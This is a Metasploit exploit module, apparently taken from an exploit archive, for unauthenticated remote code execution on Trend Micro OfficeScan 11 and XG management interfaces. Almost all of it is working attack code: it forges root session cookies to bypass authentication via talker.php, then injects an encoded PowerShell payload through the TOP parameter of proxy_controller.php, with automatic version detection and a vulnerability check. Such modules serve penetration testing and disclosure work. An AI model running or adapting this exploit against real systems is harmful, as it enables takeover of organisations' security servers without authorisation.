# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Powershell

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Trend Micro OfficeScan Remote Code Execution",
      &#039;Description&#039;    => %q{
        This module exploits the authentication bypass and command injection vulnerability together. Unauthenticated users can execute a
        terminal command under the context of the web server user.

        The specific flaw exists within the management interface, which listens on TCP port 443 by default. The Trend Micro Officescan product
        has a widget feature which is implemented with PHP. Talker.php takes ack and hash parameters but doesn&#039;t validate these values, which
        leads to an authentication bypass for the widget. Proxy.php files under the mod TMCSS folder take multiple parameters but the process
        does not properly validate a user-supplied string before using it to execute a system call. Due to combination of these vulnerabilities,
        unauthenticated users can execute a terminal command under the context of the web server user.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;mr_me <mr_me@offensive-security.com>&#039;, # author of command injection
          &#039;Mehmet Ince <mehmet@mehmetince.net>&#039; # author of authentication bypass & msf module
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://pentest.blog/one-ring-to-rule-them-all-same-rce-on-multiple-trend-micro-products/&#039;],
          [&#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-17-521/&#039;],
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;SSL&#039; => true,
          &#039;RPORT&#039; => 443
        },
      &#039;Platform&#039;       => [&#039;win&#039;],
      &#039;Arch&#039;           => [ ARCH_X86, ARCH_X64 ],
      &#039;Targets&#039;        =>
        [
          [&#039;Automatic Targeting&#039;, { &#039;auto&#039; => true }],
          [&#039;OfficeScan 11&#039;, {}],
          [&#039;OfficeScan XG&#039;, {}],
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Oct 7 2017",
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI of the Trend Micro OfficeScan management interface&#039;, &#039;/&#039;])
      ]
    )
  end

  def build_csrftoken(my_target, phpsessid=nil)
    vprint_status("Building csrftoken")
    if my_target.name == &#039;OfficeScan XG&#039;
      csrf_token = Rex::Text.md5(Time.now.to_s)
    else
      csrf_token = phpsessid.scan(/PHPSESSID=([a-zA-Z0-9]+)/).flatten[0]
    end
    csrf_token
  end

  def auto_target
    #XG version of the widget library has package.json within the same directory.
    mytarget = target
    if target[&#039;auto&#039;] && target.name =~ /Automatic/
      print_status(&#039;Automatic targeting enabled. Trying to detect version.&#039;)
      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;officescan&#039;, &#039;console&#039;, &#039;html&#039;, &#039;widget&#039;, &#039;package.json&#039;),
      })

      if res && res.code == 200
        mytarget = targets[2]
      elsif res && res.code == 404
        mytarget = targets[1]
      else
        fail_with(Failure::Unknown, &#039;Unable to automatically select a target&#039;)
      end
      print_status("Selected target system : #{mytarget.name}")
    end
    mytarget
  end

  def auth(my_target)
    # Version XG performs MD5 validation on wf_CSRF_token parameter. We can&#039;t simply use PHPSESSID directly because it contains a-zA-Z0-9.
    # Beside that, version 11 use PHPSESSID value as a csrf token. Thus, we are manually crafting the cookie.
    if my_target.name == &#039;OfficeScan XG&#039;
      csrf_token = build_csrftoken(my_target)
      cookie = "LANG=en_US; LogonUser=root; userID=1; wf_CSRF_token=#{csrf_token}"
    # Version 11 want to see valid PHPSESSID from beginning to the end. For this reason we need to force backend to initiate one for us.
    else
      vprint_status("Sending session initiation request for : #{my_target.name}.")
      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;officescan&#039;, &#039;console&#039;, &#039;html&#039;, &#039;widget&#039;, &#039;index.php&#039;),
      })
      cookie = "LANG=en_US; LogonUser=root; userID=1; #{res.get_cookies}"
      csrf_token = build_csrftoken(my_target, res.get_cookies)
    end

    # Okay, we dynamically generated a cookie and csrf_token values depends on OfficeScan version.
    # Now we need to exploit authentication bypass vulnerability.
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;officescan&#039;, &#039;console&#039;, &#039;html&#039;, &#039;widget&#039;, &#039;ui&#039;, &#039;modLogin&#039;, &#039;talker.php&#039;),
      &#039;headers&#039; => {
        &#039;X-CSRFToken&#039; => csrf_token,
        &#039;ctype&#039; => &#039;application/x-www-form-urlencoded; charset=utf-8&#039;
      },
      &#039;cookie&#039; => cookie,
      &#039;vars_post&#039; => {
        &#039;cid&#039; => &#039;1&#039;,
        &#039;act&#039; => &#039;check&#039;,
        &#039;hash&#039; => Rex::Text.rand_text_alpha(10),
        &#039;pid&#039; => &#039;1&#039;
      }
    })

    if res && res.code == 200 && res.body.include?(&#039;login successfully&#039;)
      # Another business logic in here.
      # Version 11 want to use same PHPSESSID generated at the beginning by hitting index.php
      # Version XG want to use newly created PHPSESSID that comes from auth bypass response.
      if my_target.name == &#039;OfficeScan XG&#039;
        res.get_cookies
      else
        cookie
      end
    else
       nil
    end
  end

  def check
    my_target = auto_target
    token = auth(my_target)
    # If we dont have a cookie that means authentication bypass issue has been patched on target system.
    if token.nil?
      Exploit::CheckCode::Safe
    else
      # Authentication bypass does not mean that we have a command injection.
      # Accessing to the widget framework without having command injection means literally nothing.
      # So we gonna trigger command injection vulnerability without a payload.
      csrf_token = build_csrftoken(my_target, token)
      vprint_status(&#039;Trying to detect command injection vulnerability&#039;)
      res = send_request_cgi({
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;officescan&#039;, &#039;console&#039;, &#039;html&#039;, &#039;widget&#039;, &#039;proxy_controller.php&#039;),
        &#039;headers&#039; => {
          &#039;X-CSRFToken&#039; => csrf_token,
          &#039;ctype&#039; => &#039;application/x-www-form-urlencoded; charset=utf-8&#039;
        },
        &#039;cookie&#039; => "LANG=en_US; LogonUser=root; wf_CSRF_token=#{csrf_token}; #{token}",
        &#039;vars_post&#039; => {
          &#039;module&#039; => &#039;modTMCSS&#039;,
          &#039;serverid&#039; => &#039;1&#039;,
          &#039;TOP&#039; => &#039;&#039;
        }
      })
      if res && res.code == 200 && res.body.include?(&#039;Proxy execution failed: exec report.php failed&#039;)
        Exploit::CheckCode::Vulnerable
      else
        Exploit::CheckCode::Safe
      end
    end
  end

  def exploit
    mytarget = auto_target
    print_status(&#039;Exploiting authentication bypass&#039;)
    cookie = auth(mytarget)
    if cookie.nil?
      fail_with(Failure::NotVulnerable, "Target is not vulnerable.")
    else
      print_good("Authenticated successfully bypassed.")
    end

    print_status(&#039;Generating payload&#039;)

    powershell_options = {
      encode_final_payload: true,
      remove_comspec: true
    }
    p = cmd_psh_payload(payload.encoded, payload_instance.arch.first, powershell_options)


    # We need to craft csrf value for version 11 again like we did before at auth function.
    csrf_token = build_csrftoken(mytarget, cookie)

    print_status(&#039;Trigerring command injection vulnerability&#039;)

    send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;officescan&#039;, &#039;console&#039;, &#039;html&#039;, &#039;widget&#039;, &#039;proxy_controller.php&#039;),
      &#039;headers&#039; => {
        &#039;X-CSRFToken&#039; => csrf_token,
        &#039;ctype&#039; => &#039;application/x-www-form-urlencoded; charset=utf-8&#039;
      },
      &#039;cookie&#039; => "LANG=en_US; LogonUser=root; wf_CSRF_token=#{csrf_token}; #{cookie}",
      &#039;vars_post&#039; => {
        &#039;module&#039; => &#039;modTMCSS&#039;,
        &#039;serverid&#039; => &#039;1&#039;,
        &#039;TOP&#039; => "2>&1||#{p}"
      }
    })

  end
end

